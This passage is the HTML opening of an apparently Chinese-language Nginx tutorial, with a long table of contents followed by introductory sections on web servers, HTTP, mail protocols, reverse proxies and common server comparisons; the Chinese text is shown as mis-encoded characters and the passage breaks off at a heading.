href="#nginx%E7%9A%84%E5%AE%89%E5%85%A8%E6%8E%A7%E5%88%B6">Nginxçš„å®‰å…¨æ§åˆ¶</a><ul><li><a href="#%E5%A6%82%E4%BD%95%E4%BD%BF%E7%94%A8ssl%E5%AF%B9%E6%B5%81%E9%87%8F%E8%BF%9B%E8%A1%8C%E5%8A%A0%E5%AF%86">å¦‚ä½•ä½¿ç”¨SSLå¯¹æµé‡è¿›è¡ŒåŠ å¯†</a><ul><li><a href="#nginx%E6%B7%BB%E5%8A%A0ssl%E7%9A%84%E6%94%AF%E6%8C%81">nginxæ·»åŠ SSLçš„æ”¯æŒ</a></li><li><a href="#nginx%E7%9A%84ssl%E7%9B%B8%E5%85%B3%E6%8C%87%E4%BB%A4">Nginxçš„SSLç›¸å…³æŒ‡ä»¤</a></li><li><a href="#%E7%94%9F%E6%88%90%E8%AF%81%E4%B9%A6">ç”Ÿæˆè¯ä¹¦</a></li><li><a href="#%E5%BC%80%E5%90%AFssl%E5%AE%9E%E4%BE%8B">å¼€å¯SSLå®ä¾‹</a></li></ul></li></ul></li><li><a href="#%E5%8F%8D%E5%90%91%E4%BB%A3%E7%90%86%E7%B3%BB%E7%BB%9F%E8%B0%83%E4%BC%98">åå‘ä»£ç†ç³»ç»Ÿè°ƒä¼˜</a></li><li><a href="#%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1%E6%A6%82%E8%BF%B0">è´Ÿè½½å‡è¡¡æ¦‚è¿°</a></li><li><a href="#%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1%E7%9A%84%E5%8E%9F%E7%90%86%E5%8F%8A%E5%A4%84%E7%90%86%E6%B5%81%E7%A8%8B">è´Ÿè½½å‡è¡¡çš„åŸç†åŠå¤„ç†æµç¨‹</a><ul><li><a href="#%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1%E7%9A%84%E4%BD%9C%E7%94%A8">è´Ÿè½½å‡è¡¡çš„ä½œç”¨</a></li></ul></li><li><a href="#%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1%E5%B8%B8%E7%94%A8%E7%9A%84%E5%A4%84%E7%90%86%E6%96%B9%E5%BC%8F">è´Ÿè½½å‡è¡¡å¸¸ç”¨çš„å¤„ç†æ–¹å¼</a><br />*<ul><li><a href="#%E6%96%B9%E5%BC%8F%E4%B8%80%E7%94%A8%E6%88%B7%E6%89%8B%E5%8A%A8%E9%80%89%E6%8B%A9">æ–¹å¼ä¸€:ç”¨æˆ·æ‰‹åŠ¨é€‰æ‹©</a></li><li><a href="#%E6%96%B9%E5%BC%8F%E4%BA%8Cdns%E8%BD%AE%E8%AF%A2%E6%96%B9%E5%BC%8F">æ–¹å¼äºŒ:DNSè½®è¯¢æ–¹å¼</a></li><li><a href="#%E6%96%B9%E5%BC%8F%E4%B8%89%E5%9B%9B%E4%B8%83%E5%B1%82%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1">æ–¹å¼ä¸‰:å››/ä¸ƒå±‚è´Ÿè½½å‡è¡¡</a></li><li><a href="#nginx%E4%B8%83%E5%B1%82%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1">Nginxä¸ƒå±‚è´Ÿè½½å‡è¡¡</a><ul><li><a href="#nginx%E4%B8%83%E5%B1%82%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1%E7%9A%84%E6%8C%87%E4%BB%A4">Nginxä¸ƒå±‚è´Ÿè½½å‡è¡¡çš„æŒ‡ä»¤</a><ul><li><a href="#upstream%E6%8C%87%E4%BB%A4">upstreamæŒ‡ä»¤</a></li><li><a href="#server%E6%8C%87%E4%BB%A4">serveræŒ‡ä»¤</a></li></ul></li><li><a href="#nginx%E4%B8%83%E5%B1%82%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1%E7%9A%84%E5%AE%9E%E7%8E%B0%E6%B5%81%E7%A8%8B">Nginxä¸ƒå±‚è´Ÿè½½å‡è¡¡çš„å®ç°æµç¨‹</a></li><li><a href="#%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1%E7%8A%B6%E6%80%81">è´Ÿè½½å‡è¡¡çŠ¶æ€</a><ul><li><a href="#down">down</a></li><li><a href="#backup">backup</a></li><li><a href="#max_conns">max_conns</a></li><li><a href="#max_fails%E5%92%8Cfail_timeout">max_failså’Œfail_timeout</a></li></ul></li><li><a href="#%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1%E7%AD%96%E7%95%A5">è´Ÿè½½å‡è¡¡ç­–ç•¥</a><ul><li><a href="#%E8%BD%AE%E8%AF%A2">è½®è¯¢</a></li><li><a href="#weight%E5%8A%A0%E6%9D%83%E5%8A%A0%E6%9D%83%E8%BD%AE%E8%AF%A2">weightåŠ æƒ[åŠ æƒè½®è¯¢]</a></li><li><a href="#ip_hash">ip_hash</a></li><li><a href="#least_conn">least_conn</a></li><li><a href="#url_hash">url_hash</a></li><li><a href="#fair">fair</a></li></ul></li><li><a href="#%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1%E6%A1%88%E4%BE%8B">è´Ÿè½½å‡è¡¡æ¡ˆä¾‹</a><ul><li><a href="#%E6%A1%88%E4%BE%8B%E4%B8%80%E5%AF%B9%E6%89%80%E6%9C%89%E8%AF%B7%E6%B1%82%E5%AE%9E%E7%8E%B0%E4%B8%80%E8%88%AC%E8%BD%AE%E8%AF%A2%E8%A7%84%E5%88%99%E7%9A%84%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1">æ¡ˆä¾‹ä¸€ï¼šå¯¹æ‰€æœ‰è¯·æ±‚å®ç°ä¸€èˆ¬è½®è¯¢è§„åˆ™çš„è´Ÿè½½å‡è¡¡</a></li><li><a href="#%E6%A1%88%E4%BE%8B%E4%BA%8C%E5%AF%B9%E6%89%80%E6%9C%89%E8%AF%B7%E6%B1%82%E5%AE%9E%E7%8E%B0%E5%8A%A0%E6%9D%83%E8%BD%AE%E8%AF%A2%E8%A7%84%E5%88%99%E7%9A%84%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1">æ¡ˆä¾‹äºŒï¼šå¯¹æ‰€æœ‰è¯·æ±‚å®ç°åŠ æƒè½®è¯¢è§„åˆ™çš„è´Ÿè½½å‡è¡¡</a></li><li><a href="#%E6%A1%88%E4%BE%8B%E4%B8%89%E5%AF%B9%E7%89%B9%E5%AE%9A%E8%B5%84%E6%BA%90%E5%AE%9E%E7%8E%B0%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1">æ¡ˆä¾‹ä¸‰ï¼šå¯¹ç‰¹å®šèµ„æºå®ç°è´Ÿè½½å‡è¡¡</a></li><li><a href="#%E6%A1%88%E4%BE%8B%E5%9B%9B%E5%AF%B9%E4%B8%8D%E5%90%8C%E5%9F%9F%E5%90%8D%E5%AE%9E%E7%8E%B0%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1">æ¡ˆä¾‹å››ï¼šå¯¹ä¸åŒåŸŸåå®ç°è´Ÿè½½å‡è¡¡</a></li><li><a href="#%E6%A1%88%E4%BE%8B%E4%BA%94%E5%AE%9E%E7%8E%B0%E5%B8%A6%E6%9C%89url%E9%87%8D%E5%86%99%E7%9A%84%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1">æ¡ˆä¾‹äº”ï¼šå®ç°å¸¦æœ‰URLé‡å†™çš„è´Ÿè½½å‡è¡¡</a></li></ul></li></ul></li><li><a href="#nginx%E5%9B%9B%E5%B1%82%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1">Nginxå››å±‚è´Ÿè½½å‡è¡¡</a><ul><li><a href="#%E6%B7%BB%E5%8A%A0stream%E6%A8%A1%E5%9D%97%E7%9A%84%E6%94%AF%E6%8C%81">æ·»åŠ streamæ¨¡å—çš„æ”¯æŒ</a></li><li><a href="#nginx%E5%9B%9B%E5%B1%82%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1%E7%9A%84%E6%8C%87%E4%BB%A4">Nginxå››å±‚è´Ÿè½½å‡è¡¡çš„æŒ‡ä»¤</a><ul><li><a href="#stream%E6%8C%87%E4%BB%A4">streamæŒ‡ä»¤</a></li><li><a href="#upstream%E6%8C%87%E4%BB%A4-2">upstreamæŒ‡ä»¤</a></li></ul></li><li><a href="#%E5%9B%9B%E5%B1%82%E8%B4%9F%E8%BD%BD%E5%9D%87%E8%A1%A1%E7%9A%84%E6%A1%88%E4%BE%8B">å››å±‚è´Ÿè½½å‡è¡¡çš„æ¡ˆä¾‹</a><ul><li><a href="#%E9%9C%80%E6%B1%82%E5%88%86%E6%9E%90">éœ€æ±‚åˆ†æ</a></li></ul></li></ul></li></ul></li><li><a href="#%E7%BC%93%E5%AD%98%E7%9A%84%E6%A6%82%E5%BF%B5">ç¼“å­˜çš„æ¦‚å¿µ</a></li><li><a href="#nginx%E7%9A%84web%E7%BC%93%E5%AD%98%E6%9C%8D%E5%8A%A1">Nginxçš„webç¼“å­˜æœåŠ¡</a></li><li><a href="#nginx%E7%BC%93%E5%AD%98%E8%AE%BE%E7%BD%AE%E7%9A%84%E7%9B%B8%E5%85%B3%E6%8C%87%E4%BB%A4">Nginxç¼“å­˜è®¾ç½®çš„ç›¸å…³æŒ‡ä»¤</a><ul><li><a href="#proxy_cache_path">proxy_cache_path</a></li><li><a href="#proxy_cache">proxy_cache</a></li><li><a href="#proxy_cache_key">proxy_cache_key</a></li><li><a href="#proxy_cache_valid">proxy_cache_valid</a></li><li><a href="#proxy_cache_min_uses">proxy_cache_min_uses</a></li><li><a href="#proxy_cache_methods">proxy_cache_methods</a></li></ul></li><li><a href="#nginx%E7%BC%93%E5%AD%98%E8%AE%BE%E7%BD%AE%E6%A1%88%E4%BE%8B">Nginxç¼“å­˜è®¾ç½®æ¡ˆä¾‹</a><br />*<ul><li><a href="#%E9%9C%80%E6%B1%82%E5%88%86%E6%9E%90-2">éœ€æ±‚åˆ†æ</a></li><li><a href="#%E6%AD%A5%E9%AA%A4%E5%AE%9E%E7%8E%B0">æ­¥éª¤å®ç°</a></li></ul></li><li><a href="#nginx%E7%BC%93%E5%AD%98%E7%9A%84%E6%B8%85%E9%99%A4">Nginxç¼“å­˜çš„æ¸…é™¤</a><ul><li><a href="#%E6%96%B9%E5%BC%8F%E4%B8%80%E5%88%A0%E9%99%A4%E5%AF%B9%E5%BA%94%E7%9A%84%E7%BC%93%E5%AD%98%E7%9B%AE%E5%BD%95">æ–¹å¼ä¸€:åˆ é™¤å¯¹åº”çš„ç¼“å­˜ç›®å½•</a></li><li><a href="#%E6%96%B9%E5%BC%8F%E4%BA%8C%E4%BD%BF%E7%94%A8%E7%AC%AC%E4%B8%89%E6%96%B9%E6%89%A9%E5%B1%95%E6%A8%A1%E5%9D%97">æ–¹å¼äºŒ:ä½¿ç”¨ç¬¬ä¸‰æ–¹æ‰©å±•æ¨¡å—</a><ul><li><a href="#ngx_cache_purge">ngx_cache_purge</a></li></ul></li></ul></li><li><a href="#nginx%E8%AE%BE%E7%BD%AE%E8%B5%84%E6%BA%90%E4%B8%8D%E7%BC%93%E5%AD%98">Nginxè®¾ç½®èµ„æºä¸ç¼“å­˜</a><ul><li><a href="#proxy_no_cache">proxy_no_cache</a></li><li><a href="#proxy_cache_bypass">proxy_cache_bypass</a></li><li><a href="#cookie_nocache-arg_nocache-arg_comment">$cookie_nocacheã€$arg_nocacheã€$arg_comment</a></li><li><a href="#%E6%A1%88%E4%BE%8B%E5%AE%9E%E7%8E%B0">æ¡ˆä¾‹å®ç°</a></li></ul></li><li><a href="#nginx%E4%B8%8Etomcat%E9%83%A8%E7%BD%B2">Nginxä¸Tomcatéƒ¨ç½²</a><ul><li><a href="#%E7%8E%AF%E5%A2%83%E5%87%86%E5%A4%87tomcat">ç¯å¢ƒå‡†å¤‡(Tomcat)</a></li><li><a href="#%E7%8E%AF%E5%A2%83%E5%87%86%E5%A4%87nginx">ç¯å¢ƒå‡†å¤‡(Nginx)</a></li></ul></li><li><a href="#nginx%E5%AE%9E%E7%8E%B0%E5%8A%A8%E9%9D%99%E5%88%86%E7%A6%BB">Nginxå®ç°åŠ¨é™åˆ†ç¦»</a><ul><li><a href="#%E9%9C%80%E6%B1%82%E5%88%86%E6%9E%90-3">éœ€æ±‚åˆ†æ</a></li><li><a href="#%E5%8A%A8%E9%9D%99%E5%88%86%E7%A6%BB%E5%AE%9E%E7%8E%B0%E6%AD%A5%E9%AA%A4">åŠ¨é™åˆ†ç¦»å®ç°æ­¥éª¤</a></li></ul></li><li><a href="#nginx%E5%AE%9E%E7%8E%B0tomcat%E9%9B%86%E7%BE%A4%E6%90%AD%E5%BB%BA">Nginxå®ç°Tomcaté›†ç¾¤æ­å»º</a></li><li><a href="#nginx%E9%AB%98%E5%8F%AF%E7%94%A8%E8%A7%A3%E5%86%B3%E6%96%B9%E6%A1%88">Nginxé«˜å¯ç”¨è§£å†³æ–¹æ¡ˆ</a><ul><li><a href="#keepalived">Keepalived</a></li><li><a href="#vrrp%E4%BB%8B%E7%BB%8D">VRRPä»‹ç»</a></li><li><a href="#%E7%8E%AF%E5%A2%83%E6%90%AD%E5%BB%BA">ç¯å¢ƒæ­å»º</a></li><li><a href="#keepalived%E9%85%8D%E7%BD%AE%E6%96%87%E4%BB%B6%E4%BB%8B%E7%BB%8D">Keepalivedé…ç½®æ–‡ä»¶ä»‹ç»</a></li><li><a href="#%E8%AE%BF%E9%97%AE%E6%B5%8B%E8%AF%95">è®¿é—®æµ‹è¯•</a></li><li><a href="#keepalived%E4%B9%8Bvrrp_script">keepalivedä¹‹vrrp_script</a></li></ul></li><li><a href="#lua">Lua</a><ul><li><a href="#%E6%A6%82%E5%BF%B5">æ¦‚å¿µ</a></li><li><a href="#%E7%89%B9%E6%80%A7">ç‰¹æ€§</a></li><li><a href="#%E5%BA%94%E7%94%A8%E5%9C%BA%E6%99%AF">åº”ç”¨åœºæ™¯</a></li><li><a href="#lua%E7%9A%84%E5%AE%89%E8%A3%85">Luaçš„å®‰è£…</a></li><li><a href="#lua%E7%9A%84%E8%AF%AD%E6%B3%95">Luaçš„è¯­æ³•</a><ul><li><a href="#%E7%AC%AC%E4%B8%80%E4%B8%AAlua%E7%A8%8B%E5%BA%8F">ç¬¬ä¸€ä¸ªLuaç¨‹åº</a></li><li><a href="#lua%E7%9A%84%E6%B3%A8%E9%87%8A">Luaçš„æ³¨é‡Š</a></li><li><a href="#%E6%A0%87%E8%AF%86%E7%AC%A6">æ ‡è¯†ç¬¦</a></li><li><a href="#%E5%85%B3%E9%94%AE%E5%AD%97">å…³é”®å­—</a></li><li><a href="#%E8%BF%90%E7%AE%97%E7%AC%A6">è¿ç®—ç¬¦</a></li><li><a href="#%E5%85%A8%E5%B1%80%E5%8F%98%E9%87%8F%E5%B1%80%E9%83%A8%E5%8F%98%E9%87%8F">å…¨å±€å˜é‡&amp;å±€éƒ¨å˜é‡</a></li><li><a href="#lua%E6%95%B0%E6%8D%AE%E7%B1%BB%E5%9E%8B">Luaæ•°æ®ç±»å‹</a><ul><li><a href="#nil">nil</a></li><li><a href="#boolean">boolean</a></li><li><a href="#number">number</a></li><li><a href="#string">string</a></li><li><a href="#table">table</a></li><li><a href="#function">function</a></li><li><a href="#thread">thread</a></li><li><a href="#userdata">userdata</a></li></ul></li><li><a href="#lua%E6%8E%A7%E5%88%B6%E7%BB%93%E6%9E%84">Luaæ§åˆ¶ç»“æ„</a><ul><li><a href="#if-then-elseif-else">if then elseif else</a></li><li><a href="#while%E5%BE%AA%E7%8E%AF">whileå¾ªç¯</a></li><li><a href="#repeat%E5%BE%AA%E7%8E%AF">repeatå¾ªç¯</a></li><li><a href="#for%E5%BE%AA%E7%8E%AF">forå¾ªç¯</a></li></ul></li></ul></li></ul></li><li><a href="#ngx_lua%E6%A8%A1%E5%9D%97%E6%A6%82%E5%BF%B5">ngx_luaæ¨¡å—æ¦‚å¿µ</a></li><li><a href="#ngx_lua%E6%A8%A1%E5%9D%97%E7%8E%AF%E5%A2%83%E5%87%86%E5%A4%87">ngx_luaæ¨¡å—ç¯å¢ƒå‡†å¤‡</a><ul><li><a href="#%E6%96%B9%E5%BC%8F%E4%B8%80lua-nginx-module">æ–¹å¼ä¸€:lua-nginx-module</a></li><li><a href="#%E6%96%B9%E5%BC%8F%E4%BA%8Copenrestry">æ–¹å¼äºŒ:OpenRestry</a><ul><li><a href="#%E6%A6%82%E8%BF%B0">æ¦‚è¿°</a></li><li><a href="#%E5%AE%89%E8%A3%85">å®‰è£…</a></li></ul></li></ul></li><li><a href="#ngx_lua%E7%9A%84%E4%BD%BF%E7%94%A8">ngx_luaçš„ä½¿ç”¨</a><ul><li><a href="#init_by_lua">init_by_lua*</a></li><li><a href="#init_worker_by_lua">init_worker_by_lua*</a></li><li><a href="#set_by_lua">set_by_lua*</a></li><li><a href="#rewrite_by_lua">rewrite_by_lua*</a></li><li><a href="#access_by_lua">access_by_lua*</a></li><li><a href="#content_by_lua">content_by_lua*</a></li><li><a href="#header_filter_by_lua">header_filter_by_lua*</a></li><li><a href="#body_filter_by_lua">body_filter_by_lua*</a></li><li><a href="#log_by_lua">log_by_lua*</a></li><li><a href="#balancer_by_lua">balancer_by_lua*</a></li><li><a href="#ssl_certificate_by_">ssl_certificate_by_*</a></li><li><a href="#%E9%9C%80%E6%B1%82">éœ€æ±‚:</a></li></ul></li><li><a href="#ngx_lua%E6%93%8D%E4%BD%9Credis">ngx_luaæ“ä½œRedis</a><ul><li><a href="#lua-resty-redis%E7%8E%AF%E5%A2%83%E5%87%86%E5%A4%87">lua-resty-redisç¯å¢ƒå‡†å¤‡</a></li></ul></li><li><a href="#ngx_lua%E6%93%8D%E4%BD%9Cmysql">ngx_luaæ“ä½œMysql</a><ul><li><a href="#lua-resty-mysql">lua-resty-mysql</a><ul><li><a href="#%E4%BD%BF%E7%94%A8lua-resty-mysql%E5%AE%9E%E7%8E%B0%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E6%9F%A5%E8%AF%A2">ä½¿ç”¨lua-resty-mysqlå®ç°æ•°æ®åº“çš„æŸ¥è¯¢</a></li><li><a href="#%E4%BD%BF%E7%94%A8lua-cjson%E5%A4%84%E7%90%86%E6%9F%A5%E8%AF%A2%E7%BB%93%E6%9E%9C">ä½¿ç”¨lua-cjsonå¤„ç†æŸ¥è¯¢ç»“æœ</a></li><li><a href="#lua-resty-mysql%E5%AE%9E%E7%8E%B0%E6%95%B0%E6%8D%AE%E5%BA%93%E7%9A%84%E5%A2%9E%E5%88%A0%E6%94%B9">lua-resty-mysqlå®ç°æ•°æ®åº“çš„å¢åˆ æ”¹</a></li></ul></li><li><a href="#%E7%BB%BC%E5%90%88%E5%B0%8F%E6%A1%88%E4%BE%8B">ç»¼åˆå°æ¡ˆä¾‹</a></li></ul></li></ul></p><h1 id="nginxåŸºç¡€ç¯‡"><a class="markdownIt-Anchor" href="#nginxåŸºç¡€ç¯‡"></a> NginxåŸºç¡€ç¯‡</h1><h2 id="nginxç®€ä»‹"><a class="markdownIt-Anchor" href="#nginxç®€ä»‹"></a> Nginxç®€ä»‹</h2><h3 id="èƒŒæ™¯ä»‹ç»"><a class="markdownIt-Anchor" href="#èƒŒæ™¯ä»‹ç»"></a> èƒŒæ™¯ä»‹ç»</h3><p>Nginxï¼ˆâ€œengine xâ€ï¼‰ä¸€ä¸ªå…·æœ‰é«˜æ€§èƒ½çš„ã€HTTPã€‘å’Œã€åå‘ä»£ç†ã€‘çš„ã€WEBæœåŠ¡å™¨ã€‘ï¼ŒåŒæ—¶ä¹Ÿæ˜¯ä¸€ä¸ªã€POP3/SMTP/IMAPä»£ç†æœåŠ¡å™¨ã€‘ï¼Œæ˜¯ç”±ä¼Šæˆˆå°”Â·èµ›ç´¢è€¶å¤«(ä¿„ç½—æ–¯äºº)ä½¿ç”¨Cè¯­è¨€ç¼–å†™çš„ï¼ŒNginxçš„ç¬¬ä¸€ä¸ªç‰ˆæœ¬æ˜¯2004å¹´10æœˆ4å·å‘å¸ƒçš„0.1.0ç‰ˆæœ¬ã€‚å¦å¤–å€¼å¾—ä¸€æçš„æ˜¯ä¼Šæˆˆå°”Â·èµ›ç´¢è€¶å¤«å°†Nginxçš„æºç è¿›è¡Œäº†å¼€æºï¼Œè¿™ä¹Ÿä¸ºNginxçš„å‘å±•æä¾›äº†è‰¯å¥½çš„ä¿éšœã€‚</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/1573470187616.png" alt="1573470187616" /></p><h4 id="åè¯è§£é‡Š"><a class="markdownIt-Anchor" href="#åè¯è§£é‡Š"></a> åè¯è§£é‡Š</h4><ol><li>WEBæœåŠ¡å™¨ï¼š</li></ol><p>WEBæœåŠ¡å™¨ä¹Ÿå«ç½‘é¡µæœåŠ¡å™¨ï¼Œè‹±æ–‡åå«Web Serverï¼Œä¸»è¦åŠŸèƒ½æ˜¯ä¸ºç”¨æˆ·æä¾›ç½‘ä¸Šä¿¡æ¯æµè§ˆæœåŠ¡ã€‚</p><ol start="2"><li>HTTP:</li></ol><p>HTTPæ˜¯è¶…æ–‡æœ¬ä¼ è¾“åè®®çš„ç¼©å†™ï¼Œæ˜¯ç”¨äºä»WEBæœåŠ¡å™¨ä¼ è¾“è¶…æ–‡æœ¬åˆ°æœ¬åœ°æµè§ˆå™¨çš„ä¼ è¾“åè®®ï¼Œä¹Ÿæ˜¯äº’è”ç½‘ä¸Šåº”ç”¨æœ€ä¸ºå¹¿æ³›çš„ä¸€ç§ç½‘ç»œåè®®ã€‚HTTPæ˜¯ä¸€ä¸ªå®¢æˆ·ç«¯å’ŒæœåŠ¡å™¨ç«¯è¯·æ±‚å’Œåº”ç­”çš„æ ‡å‡†ï¼Œå®¢æˆ·ç«¯æ˜¯ç»ˆç«¯ç”¨æˆ·ï¼ŒæœåŠ¡ç«¯æ˜¯ç½‘ç«™ï¼Œé€šè¿‡ä½¿ç”¨Webæµè§ˆå™¨ã€ç½‘ç»œçˆ¬è™«æˆ–è€…å…¶ä»–å·¥å…·ï¼Œå®¢æˆ·ç«¯å‘èµ·ä¸€ä¸ªåˆ°æœåŠ¡å™¨ä¸ŠæŒ‡å®šç«¯å£çš„HTTPè¯·æ±‚ã€‚</p><ol start="3"><li>POP3/SMTP/IMAPï¼š</li></ol><p>POP3(Post Offic Protocol 3)é‚®å±€åè®®çš„ç¬¬ä¸‰ä¸ªç‰ˆæœ¬ï¼Œ</p><p>SMTP(Simple Mail Transfer Protocol)ç®€å•é‚®ä»¶ä¼ è¾“åè®®ï¼Œ</p><p>IMAP(Internet Mail Access Protocol)äº¤äº’å¼é‚®ä»¶å­˜å–åè®®ï¼Œ</p><p>é€šè¿‡ä¸Šè¿°åè¯çš„è§£é‡Šï¼Œæˆ‘ä»¬å¯ä»¥äº†è§£åˆ°Nginxä¹Ÿå¯ä»¥ä½œä¸ºç”µå­é‚®ä»¶ä»£ç†æœåŠ¡å™¨ã€‚</p><ol start="4"><li>åå‘ä»£ç†</li></ol><p>æ­£å‘ä»£ç†</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/1573489359728.png" alt="1573489359728" /></p><p>åå‘ä»£ç†</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/1573489653799.png" alt="1573489653799" /></p><h3 id="å¸¸è§æœåŠ¡å™¨å¯¹æ¯”"><a class="markdownIt-Anchor" href="#å¸¸è§æœåŠ¡å™¨å¯¹æ¯”"></a> å¸¸è§æœåŠ¡å™¨å¯¹æ¯”</h3><p>åœ¨ä»‹ç»è¿™ä¸€èŠ‚å†…å®¹ä¹‹å‰ï¼Œæˆ‘ä»¬å…ˆæ¥è®¤è¯†ä¸€å®¶å…¬å¸å«Netcraftã€‚</p><figure class="highlight apache"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><code class="hljs apache"><span class="hljs-attribute">Netcraft</span>å…¬å¸äº<span class="hljs-number">1994</span>å¹´åº•åœ¨è‹±å›½æˆç«‹ï¼Œå¤šå¹´æ¥ä¸€ç›´è‡´åŠ›äºäº’è”ç½‘å¸‚åœºä»¥åŠåœ¨çº¿å®‰å…¨æ–¹é¢çš„å’¨è¯¢æœåŠ¡ï¼Œå…¶ä¸­åœ¨å›½é™…ä¸Šæœ€å…·å½±å“åŠ›çš„å½“å±å…¶é’ˆå¯¹ç½‘ç«™æœåŠ¡å™¨ã€SSLå¸‚åœºæ‰€åšçš„å®¢è§‚ä¸¥è°¨çš„åˆ†æç ”ç©¶ï¼Œå…¬å¸å®˜ç½‘æ¯æœˆå…¬å¸ƒçš„è°ƒç ”æ•°æ®ï¼ˆWeb Server Surveyï¼‰å·²æˆä¸ºå½“ä»Šäººä»¬äº†è§£å…¨çƒç½‘ç«™æ•°é‡ä»¥åŠæœåŠ¡å™¨å¸‚åœºåˆ†é¢æƒ…å†µçš„ä¸»è¦å‚è€ƒä¾æ®ï¼Œæ—¶å¸¸è¢«è¯¸å¦‚åå°”è¡—æ‚å¿—ï¼Œè‹±å›½BBCï¼ŒSlashdotç­‰åª’ä½“æŠ¥é“æˆ–å¼•ç”¨ã€‚<br></code></pre></td></tr></table></figure><p>æˆ‘ä»¬å…ˆæ¥çœ‹ä¸€ç»„æ•°æ®ï¼Œæˆ‘ä»¬å…ˆæ‰“å¼€Nginxçš„å®˜æ–¹ç½‘ç«™  <a href="http://nginx.org/">http://nginx.org/</a>,æ‰¾åˆ°Netcraftå…¬å¸å…¬å¸ƒçš„æ•°æ®ï¼Œå¯¹å½“å‰ä¸»æµæœåŠ¡å™¨äº§å“è¿›è¡Œä»‹ç»ã€‚</p><p><img src="https://typora-xyy.oss-cn-nanjing.aliyuncs.com/imgs/1581394945120.png" alt="1581394945120" /></p><p>ä¸Šé¢è¿™å¼ å›¾å±•ç¤ºäº†2019å¹´å…¨çƒä¸»æµWebæœåŠ¡å™¨çš„å¸‚åœºæƒ…å†µï¼Œå…¶ä¸­æœ‰Apacheã€Microsoft-IISã€google Serversã€Nginxã€Tomcatç­‰ï¼Œè€Œæˆ‘ä»¬åœ¨äº†è§£æ–°äº‹ç‰©çš„æ—¶å€™ï¼Œå¾€å¾€ä¹ æƒ¯é€šè¿‡ç±»æ¯”æ¥å¸®åŠ©è‡ªå·±ç†è§£äº‹ç‰©çš„æ¦‚è²Œã€‚æ‰€ä»¥ä¸‹é¢æˆ‘ä»¬æŠŠå‡ ç§å¸¸è§çš„æœåŠ¡å™¨æ¥ç»™å¤§å®¶ç®€å•ä»‹ç»ä¸‹ï¼š</p><h4 id="iis"><a class="markdownIt-Anchor" href="#iis"></a> IIS</h4><p>â€‹å…¨ç§°(Internet Information Services)å³äº’è”ç½‘ä¿¡æ¯æœåŠ¡ï¼Œæ˜¯ç”±å¾®è½¯å…¬å¸æä¾›çš„åŸºäºwindowsç³»ç»Ÿçš„äº’è”ç½‘åŸºæœ¬æœåŠ¡ã€‚windowsä½œä¸ºæœåŠ¡å™¨åœ¨ç¨³å®šæ€§ä¸å…¶ä»–ä¸€äº›æ€§èƒ½ä¸Šéƒ½ä¸å¦‚ç±»UNIXæ“ä½œç³»ç»Ÿï¼Œå› æ­¤åœ¨éœ€è¦é«˜æ€§èƒ½WebæœåŠ¡å™¨çš„åœºåˆä¸‹ï¼ŒIISå¯èƒ½å°±ä¼šè¢«&quot;å†·è½&quot;.</p><h4 id="tomcat"><a class="markdownIt-Anchor" href="#tomcat"></a> Tomcat</h4><p>â€‹Tomcatæ˜¯ä¸€ä¸ªè¿è¡ŒServletå’ŒJSPçš„Webåº”ç”¨è½¯ä»¶ï¼ŒTomcatæŠ€æœ¯å…ˆè¿›ã€æ€§èƒ½ç¨³å®šè€Œä¸”å¼€æ”¾æºä»£ç ï¼Œå› æ­¤æ·±å—Javaçˆ±å¥½è€…çš„å–œçˆ±å¹¶å¾—åˆ°äº†éƒ¨åˆ†è½¯ä»¶å¼€å‘å•†çš„è®¤å¯ï¼Œæˆä¸ºç›®å‰æ¯”è¾ƒæµè¡Œçš„Webåº”ç”¨æœåŠ¡å™¨ã€‚ä½†æ˜¯Tomcatå¤©ç”Ÿæ˜¯ä¸€ä¸ªé‡é‡çº§çš„WebæœåŠ¡å™¨ï¼Œå¯¹é™æ€æ–‡ä»¶å’Œé«˜å¹¶å‘çš„å¤„ç†æ¯”è¾ƒå¼±ã€‚</p><h4 id="apache"><a class="markdownIt-Anchor" href="#apache"></a> 